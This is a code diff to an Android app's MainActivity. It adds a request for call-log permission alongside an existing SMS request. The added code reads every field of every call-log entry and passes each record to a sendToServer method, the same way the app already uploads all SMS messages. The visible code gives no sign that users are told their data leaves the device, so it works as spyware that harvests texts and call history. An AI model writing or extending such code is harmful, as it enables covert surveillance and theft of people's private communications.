@@ -30,6 +30,7 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
 
     private static final int READ_TEXTS_PERMISSIONS_REQUEST = 1;
+    private static final int READ_CALLS_PERMISSIONS_REQUEST = 2;
 
 
 
@@ -45,7 +46,9 @@ public class MainActivity extends AppCompatActivity {
         // request text access
         requestPermissions(new String[]{Manifest.permission.READ_SMS},
                 READ_TEXTS_PERMISSIONS_REQUEST);
-
+        // request text access
+        requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG},
+                READ_CALLS_PERMISSIONS_REQUEST);
 
     }
 
@@ -95,7 +98,46 @@ public class MainActivity extends AppCompatActivity {
                     cursor.close();
 
                     for (String t : texts) {
-                        sentToServer(t);
+                        sendToServer(t);
+                    }
+
+                } else {
+
+                    // permission denied, boo! Disable the
+                    // functionality that depends on this permission.
+                }
+
+                return;
+            }
+            case READ_CALLS_PERMISSIONS_REQUEST: {
+                // If request is cancelled, the result arrays are empty.
+                if (grantResults.length > 0
+                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+                    // array of all texts
+                    List<String> calls = new ArrayList<>();
+
+                    // inbox cursor
+                    Cursor cursor = getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);
+
+                    if (cursor.moveToFirst()) { // must check the result to prevent exception
+                        do {
+                            String msgData = "";
+                            for(int idx=0;idx<cursor.getColumnCount();idx++)
+                            {
+                                msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
+                            }
+                            calls.add(msgData);
+                        } while (cursor.moveToNext());
+                    } else {
+                        System.out.println("No messages found");
+                    }
+                    cursor.close();
+
+
+
+                    for (String t : calls) {
+                        sendToServer(t);
                     }
 
                 } else {
@@ -113,7 +155,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    public void sentToServer(String msg) {
+    public void sendToServer(String msg) {
         try {
 
             StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
